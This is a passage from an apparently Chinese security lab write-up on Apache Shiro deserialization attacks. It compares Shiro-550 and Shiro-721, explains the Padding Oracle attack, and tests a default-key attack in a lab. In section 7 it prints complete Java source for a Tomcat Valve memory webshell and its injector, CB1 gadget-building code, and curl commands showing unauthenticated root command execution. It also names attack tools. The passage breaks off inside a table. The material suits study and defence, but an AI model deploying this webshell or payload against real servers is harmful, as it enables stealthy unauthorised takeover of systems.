相关）</span></span></p></td></tr></tbody></table>## 5.3 关键结论  
  
═══════════════════════════════════════════════════════════            
  
    
结论: 高版本 JDK 不能阻止 Shiro 反序列化攻击            
  
═══════════════════════════════════════════════════════════            
  
    
• CB1 / CC6 / CC5 在 JDK 8 / 11 / 17 上均可 RCE            
  
    
• TemplatesImpl 本地类加载不受 trustURLCodebase 限制            
  
    
• CC1 失效是 JDK 修改导致，但有 CB1/CC6 等替代链            
  
    
• 唯一有效的防御：升级 Shiro 版本 或 自定义强随机密钥            
  
═══════════════════════════════════════════════════════════  
  
  
   
# 六、场景四：Shiro-550 vs Shiro-721 对比分析  
## 6.1 核心区别  
<table><tbody><tr><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">对比项</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro-550</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro-721</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CVE 编号</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CVE-2016-4437</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CVE-2019-12422</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">影响版本</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro ≤ 1.2.4</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro 1.2.5 ~ 1.4.1</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">密钥问题</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">硬编码默认密钥</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">密钥随机生成</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">攻击前提</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥（默认/字典/泄露）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">不需要知道密钥，需要有效账号</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">攻击方法</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">用已知密钥直接加密恶意对象</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Padding Oracle 攻击伪造密文</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">加密模式</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AES-CBC</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AES-CBC（未变）</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">攻击耗时</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">秒级（1 次请求）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">小时级（数万次请求）</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">修复版本</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.2.5（密钥随机化）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.4.2（AES-GCM）</span></span></p></td></tr></tbody></table>## 6.2 Padding Oracle 攻击原理详解  
  
AES-CBC 解密过程：  
  
                         
AES  
   
Key            
  
                           
↓            
  
Ciphertext Block[i] → [AES Decrypt] → Intermediate Value (I)            
  
                                            
⊕ (XOR)            
  
Ciphertext Block[i-1] ───────────────→ Previous Block            
  
                                            
↓            
  
                                       
Plaintext Block[i]            
  
                                            
↓            
  
                                
验证 PKCS5 Padding 是否合法            
  
                                       
↓  
             
↓            
  
                                     
合法  
           
不合法            
  
                                       
↓  
             
↓            
  
                                
继续反序列化  
      
BadPaddingException  
  
Padding Oracle 的关键：  
  
如果目标应用在 Padding 合法和不合法时返回可区分的 HTTP 响应（不同的状态码、不同的 Cookie、不同的响应时间等），攻击者就获得了一个 Padding Oracle。            
  
  
有了 Oracle，攻击者可以：            
  
1. 逐字节探测出每个密文块的中间值（Intermediate Value）            
  
2. 利用 CBC-R（CBC Reverse）技术，将任意明文对应的密文逐块构造出来            
  
3. 将恶意序列化数据作为目标明文 → 伪造完整的有效密文 → 发送            
  
4. 整个过程不需要知道 AES 密钥  
  
利用流程：  
  
1. 合法登录 → 勾选 Remember Me → 获得有效 rememberMe Cookie            
  
     
(这是一个用服务器随机密钥加密的合法密文)            
  
          
↓            
  
2. 修改密文最后一个块的倒数第二个字节            
  
     
→ 发送给服务器 → 观察响应            
  
     
→ 如果 Padding 合法: 响应 A            
  
     
→ 如果 Padding 不合法: 响应 B            
  
          
↓            
  
3. 遍历 0x00~0xFF，找到使 Padding 合法的字节值            
  
     
→ 推算出 Intermediate 的最后一个字节            
  
     
→ 重复 16 次推算出整个 Intermediate            
  
          
↓            
  
4. Intermediate XOR 目标明文 = 所需的前一个密文块            
  
     
→ 从最后一块向前逐块构造            
  
     
→ 构造完成后得到一个合法密文，内容是恶意序列化数据            
  
          
↓            
  
5. 用伪造密文替换 rememberMe Cookie → 触发反序列化 → RCE  
## 6.3 实验：550 攻击在 1.4.1 上的失效  
  
# Shiro 1.4.1 运行在 :8082（随机密钥）            
  
# 尝试用默认密钥 kPH+bIxk5D2deZiIxcaaaA== 加密 CB1 payload            
  
  
$ COOKIE=$(python3 shiro_exp.py CommonsBeanutils1 "touch /tmp/test721" \            
  
      
--key "kPH+bIxk5D2deZiIxcaaaA==")            
  
$ curl -s -o /dev/null -w "%{http_code}" \            
  
      
-H "Cookie: rememberMe=$COOKIE" http://127.0.0.1:8082/            
  
302            
  
  
$ ls /tmp/test721            
  
ls: cannot access '/tmp/test721': No such file or directory            
  
← RCE 失败! 默认密钥在 Shiro 1.4.1 上无效  
  
结论确认：Shiro 1.4.1 的随机密钥使得 Shiro-550 的默认密钥攻击完全失效。要攻击 Shiro 1.4.1，必须使用 Padding Oracle（Shiro-721）或通过其他方式获取密钥。  
## 6.4 Padding Oracle 的实际可行性  
  
重要发现：在我们的实验中，默认配置的 Shiro 1.4.1 对 Padding 合法和不合法的请求返回完全相同的 HTTP 响应（都是 302 + deleteMe），导致基于 Cookie 的 Oracle 不可观测。  
  
# Padding 不合法 → 302 + deleteMe            
  
# Padding 合法但内容错误 → 302 + deleteMe  
    
(反序列化异常)            
  
# 两者响应完全一致 → 无法区分 → Oracle 不可用            
  
  
实际利用 721 时可能的 Oracle 来源：            
  
• 响应时间差异（Timing Oracle）—— 难度高            
  
• 目标应用自定义异常处理导致的响应差异            
  
• HTTP 响应体大小差异（某些版本）  
## 6.5 版本修复时间线  
  
Shiro 1.2.4  
    
→ 硬编码密钥 → Shiro-550 可利用            
  
      
↓ 修复: 密钥随机化            
  
Shiro 1.2.5  
    
→ 随机密钥, 但仍用 AES-CBC → Shiro-721 可利用            
  
      
↓            
  
Shiro 1.4.1  
    
→ 仍然 AES-CBC            
  
      
↓ 修复: 切换到 AES-GCM (认证加密, 无 Padding Oracle)            
  
Shiro 1.4.2+ → AES-GCM → Shiro-550 和 721 均已修复            
  
      
↓            
  
Shiro 1.7+  
     
→ 进一步安全加固  
  
  
   
# 七、场景五：不出网环境利用（内存马/回显）  
## 7.1 为什么 Shiro 利用天然不需要出网  
  
这是一个非常重要的认识：与 Log4j（CVE-2021-44228）、Fastjson 等漏洞不同，Shiro 的反序列化攻击天然就是"不出网"的。  
  
对比: 出网型漏洞 vs 不出网型漏洞            
  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━            
  
出网型 (Log4j / Fastjson JNDI):            
  
    
攻击者发送 payload → 目标解析 JNDI 表达式            
  
    
→ 目标主动连接攻击者的 LDAP/RMI 服务器            
  
    
→ 从攻击者服务器下载 .class 文件            
  
    
→ 加载并执行恶意类            
  
    
需要: 目标能访问攻击者服务器 (出网)            
  
  
不出网型 (Shiro 反序列化):            
  
    
攻击者将完整的恶意序列化对象加密为 Cookie            
  
    
→ Cookie 中已包含恶意类的完整字节码 (_bytecodes)            
  
    
→ 服务器解密 Cookie → 反序列化            
  
    
→ TemplatesImpl.defineClass() 直接在 JVM 内加载            
  
    
不需要出网! payload 自包含在 Cookie 中            
  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
## 7.2 不出网的挑战：命令回显  
  
虽然 RCE 不需要出网，但存在一个实际问题：如何看到命令执行的输出？            
  
  
• Runtime.exec("id") 可以执行命令，但输出在服务端进程的 stdout            
  
• 攻击者无法直接看到输出（不像 Web Shell 能在 HTTP 响应中返回）            
  
• 传统方法：通过 DNS/HTTP 外传数据（OOB）→ 需要出网            
  
  
不出网解决方案：注入内存 Webshell（内存马），后续请求通过 HTTP 响应直接回显命令输出。  
## 7.3 Tomcat Valve 内存马注入  
  
选择 Valve 而非 Filter 的原因：  
  
Tomcat 处理请求的管道（Pipeline）中，Valve 在 Filter 之前执行：  
  
客户端 HTTP 请求            
  
      
↓            
  
Connector (接收连接)            
  
      
↓            
  
Engine Valve 链            
  
      
↓            
  
Host Valve 链            
  
      
↓            
  
Context Valve 链  
      
← 我们在这里注入 EvilValve            
  
      
↓            
  
Filter 链            
  
    
├── ShiroFilter  
     
← Shiro 认证过滤器（被绕过！）            
  
    
├── 其他 Filter            
  
    
└── ...            
  
      
↓            
  
Servlet (DispatcherServlet)            
  
  
关键优势: Valve 在 Shiro Filter 之前执行            
  
→ 内存马可以绕过 Shiro 认证            
  
→ 无需登录即可使用内存马执行命令  
## 7.4 内存马源码详解  
  
整体架构：  
  
我们的内存马由两个 Java 类组成，都打包在 TemplatesImpl 的 _bytecodes 中：            
  
• MemShellV2.class —— 注入器（extends AbstractTranslet，TemplatesImpl 入口点）            
  
• EvilValve.class —— 命令执行回显 Valve（extends ValveBase）  
  
EvilValve —— 命令回显 Valve 完整代码：  
  
import org.apache.catalina.connector.Request;            
  
import org.apache.catalina.connector.Response;            
  
import org.apache.catalina.valves.ValveBase;            
  
  
public class EvilValve extends ValveBase {            
  
      
@Override            
  
      
public void invoke(Request request, Response response)            
  
              
throws IOException, ServletException {            
  
          
// 检查 cmd 参数            
  
          
String cmd = request.getParameter("cmd");            
  
          
if (cmd != null && !cmd.isEmpty()) {            
  
              
response.setContentType("text/plain; charset=UTF-8");            
  
              
try {            
  
                  
// 执行系统命令            
  
                  
Process p = Runtime.getRuntime().exec(            
  
                      
new String[]{"/bin/sh", "-c", cmd});            
  
                  
// 读取命令输出            
  
                  
BufferedReader br = new BufferedReader(            
  
                      
new InputStreamReader(p.getInputStream()));            
  
                  
StringBuilder sb = new StringBuilder();            
  
                  
String line;            
  
                  
while ((line = br.readLine()) != null)            
  
                      
sb.append(line).append("\n");            
  
                  
p.waitFor();            
  
                  
// 将输出写入 HTTP 响应体（回显）            
  
                  
response.getWriter().write(sb.toString());            
  
                  
response.getWriter().flush();            
  
              
} catch (Exception e) {            
  
                  
response.getWriter().write("ERR: " + e);            
  
              
}            
  
              
return; // 不传递给后续 Valve/Filter            
  
          
}            
  
          
// 无 cmd 参数时正常通过            
  
          
getNext().invoke(request, response);            
  
      
}            
  
}  
  
MemShellV2 —— 注入器完整代码：  
  
public class MemShellV2 extends AbstractTranslet {            
  
      
// 类加载时自动执行注入            
  
      
static {            
  
          
try {            
  
              
// 1. 获取当前线程的 ClassLoader            
  
              
ClassLoader cl = Thread.currentThread()            
  
                  
.getContextClassLoader();            
  
              
  
              
// 2. 沿 ClassLoader 层级找到 StandardContext            
  
              
//  
      
WebappClassLoaderBase → resources → getContext()            
  
              
Object ctx = getStandardContext(cl);            
  
              
  
              
// 3. 获取 Pipeline 并注入 Valve            
  
              
Object pipeline = ctx.getClass()            
  
                  
.getMethod("getPipeline").invoke(ctx);            
  
              
pipeline.getClass()            
  
                  
.getMethod("addValve",            
  
                      
Class.forName("org.apache.catalina.Valve"))            
  
                  
.invoke(pipeline, new EvilValve());            
  
              
// 注入完成！后续所有请求都会经过 EvilValve            
  
          
} catch (Exception e) { }            
  
      
}            
  
      
  
      
// 沿 ClassLoader 层级向上查找 StandardContext            
  
      
static Object getStandardContext(ClassLoader cl) {            
  
          
while (cl != null) {            
  
              
try {            
  
                  
// WebappClassLoaderBase 有 resources 字段            
  
                  
Field f = cl.getClass().getDeclaredField("resources");            
  
                  
f.setAccessible(true);            
  
                  
Object resources = f.get(cl);            
  
                  
// StandardRoot.getContext() → StandardContext            
  
                  
return resources.getClass()            
  
                      
.getMethod("getContext").invoke(resources);            
  
              
} catch (Exception e) {            
  
                  
cl = cl.getParent();            
  
              
}            
  
          
}            
  
          
return null;            
  
      
}            
  
}  
  
Gadget 构建代码（BuildCBPayload）：  
  
// 核心构建逻辑            
  
TemplatesImpl templates = new TemplatesImpl();            
  
// _bytecodes 包含注入器和 Valve 两个类的字节码            
  
setField(templates, "_bytecodes", new byte[][]{            
  
      
readFile("MemShellV2.class"),  
    
// 注入器            
  
      
readFile("EvilValve.class")  
      
// Valve 回显            
  
});            
  
setField(templates, "_name", "Pwnr");            
  
setField(templates, "_tfactory", new TransformerFactoryImpl());            
  
  
// CB1 链: PriorityQueue + BeanComparator            
  
BeanComparator cmp = new BeanComparator(            
  
      
null, String.CASE_INSENSITIVE_ORDER);            
  
PriorityQueue             q = new PriorityQueue<>(2, cmp);             
  
q.add("1"); q.add("1");             
  
// 反射修改: 属性 → outputProperties, 元素 → templates             
  
setField(cmp, "property", "outputProperties");             
  
Object[] arr = (Object[]) getField(q, "queue");             
  
arr[0] = templates; arr[1] = templates;             
  
// 序列化             
  
new ObjectOutputStream(out).writeObject(q);             
  
// 最终产物: memshell2.ser (约 5.7KB)  
  
## 7.5 实战效果展示  
  
Step 1: 加密并发送注入请求  
  
# 加密 memshell2.ser → rememberMe Cookie               
  
$ COOKIE=$(python3 shiro_exp.py x x --raw memshell2.ser)               
  
$ echo "Cookie 长度: ${#COOKIE} 字符"               
  
Cookie 长度: 7680 字符  
     
← 刚好 < 8KB Tomcat 默认 Header 限制               
  
  
# 发送注入请求（无需登录！）               
  
$ curl -o /dev/null -w "HTTP: %{http_code}\n" \               
  
      
-H "Cookie: rememberMe=$COOKIE" http://target:8080/               
  
HTTP: 302  
     
← Shiro 处理了 Cookie，内存马注入完成  
  
Step 2: 使用内存马（命令回显）  
  
# 执行 id 命令               
  
$ curl "http://target:8080/?cmd=id"               
  
uid=0(root) gid=0(root) groups=0(root)               
  
  
# 执行 uname -a               
  
$ curl "http://target:8080/?cmd=uname+-a"               
  
Linux d9ba14c01506 5.15.200 #5 SMP ... x86_64 GNU/Linux               
  
  
# 查看系统信息               
  
$ curl "http://target:8080/?cmd=cat+/etc/os-release"               
  
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"               
  
NAME="Debian GNU/Linux"               
  
VERSION_ID="8"               
  
...               
  
  
注意: 整个过程:               
  
• 无需登录（Valve 在 Shiro 认证之前执行）               
  
• 无需出网（payload 完全包含在 Cookie 中）               
  
• 无磁盘文件（内存马驻留在 JVM 内存中）               
  
• 后续命令通过 HTTP 参数传递，无需再次携带 Cookie  
  
![](https://mmbiz.qpic.cn/mmbiz_png/p5fhoJ8nULLpbHTDia7PZcLtXy9oGltVqqXlPufTibK3HNFSH7hGm71xORdiaF3Tk2yl5tvT2gYLiazUOE62Zd9rlPoqvcicOibcn9MsUsFSQuZgY/640?wx_fmt=png "")  
  
图 7-1：内存马注入 + 命令回显（终端）—— 7680 字符 Cookie，注入后直接执行 id/whoami  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULIPA1ibWZ6qvKg8W12ls2oibHpN206aYiasISm3oIeUaAGn518tKfsR9gYH9A7uqzRK9Za8DOE0e0r9E2InjRWTFk2vbBHz6sOL88/640?wx_fmt=png "")  
  
图 7-2：浏览器直接访问回显 —— 无需登录，root 权限，完整系统信息  
## 7.6 内存马的优势与局限  
<table><tbody><tr><td data-colwidth="288" width="288" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">优势</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">局限</span></span></p></td></tr><tr><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">完全不出网，payload 自包含在 Cookie</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Cookie 大小受 Tomcat maxHttpHeaderSize 限制（默认 8KB）</span></span></p></td></tr><tr><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Valve 在 ShiroFilter 之前执行，绕过认证</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">内存马在 JVM 重启后消失（需重新注入）</span></span></p></td></tr><tr><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">后续请求无需 Cookie（通过 URL 参数传递命令）</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">大型 Translet 类可能超出 Cookie 大小限制</span></span></p></td></tr><tr><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">不在磁盘留下 Webshell 文件（内存驻留）</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">需要了解目标容器类型（Tomcat/Jetty/Undertow）</span></span></p></td></tr><tr><td data-colwidth="288" width="288" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">支持任意命令执行 + HTTP 回显</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">某些 WAF 可能检测超长 Cookie</span></span></p></td></tr></tbody></table>## 7.7 实战工具推荐  
<table><tbody><tr><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">工具</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">功能</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">特点</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">ShiroAttack2</span></span><o:page></o:page></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro 自动化利用</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">集成密钥检测 + 多链尝试 + 内存马注入</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Godzilla (哥斯拉)</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p 